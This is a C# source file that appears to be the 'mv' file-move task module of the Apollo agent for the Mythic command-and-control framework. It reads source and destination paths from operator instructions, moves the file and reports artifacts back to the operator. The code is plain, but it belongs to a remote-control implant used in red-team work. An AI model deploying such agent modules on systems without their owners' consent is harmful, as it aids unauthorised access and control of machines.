#define COMMAND_NAME_UPPER

#if DEBUG
#define MV
#endif

#if MV

using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.Serialization;
using System.Text;
using ST = System.Threading.Tasks;


namespace Tasks
{
    public class mv : Tasking
    {
        [DataContract]
        internal struct MvParameters
        {
            [DataMember(Name = "source")] public string SourceFile;
            [DataMember(Name = "destination")] public string DestinationFile;
        }
        public mv(IAgent agent, Task data) : base(agent, data)
        {
        }

        public override void Kill()
        {
            base.Kill();
        }

        public override ST.Task CreateTasking()
        {
            return new ST.Task(() =>
            {
                TaskResponse resp;
                MvParameters parameters = _jsonSerializer.Deserialize<MvParameters>(_data.Parameters);
                if (!File.Exists(parameters.SourceFile))
                {
                    resp = CreateTaskResponse(
                        $"File {parameters.SourceFile} does not exist.",
                        true, "error");
                }
                else
                {
                    try
                    {
                        FileInfo sinfo = new FileInfo(parameters.SourceFile);
                        File.Move(parameters.SourceFile, parameters.DestinationFile);
                        FileInfo dinfo = new FileInfo(parameters.DestinationFile);
                        resp = CreateTaskResponse(
                            $"Moved {sinfo.FullName} to {dinfo.FullName}",
                            true,
                            "completed",
                            new IMythicMessage[]
                            {
                                Artifact.FileOpen(sinfo.FullName),
                                Artifact.FileDelete(sinfo.FullName),
                                Artifact.FileOpen(dinfo.FullName),
                                Artifact.FileWrite(dinfo.FullName, dinfo.Length)
                            });
                    }
                    catch (Exception ex)
                    {
                        resp = CreateTaskResponse(
                            $"Failed to move {parameters.SourceFile}: {ex.Message}", true, "error");
                    }
                }
                // Your code here..
                // CreateTaskResponse to create a new TaskResposne object
                // Then add response to queue
                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
            }, _cancellationToken.Token);
        }
    }
}

#endif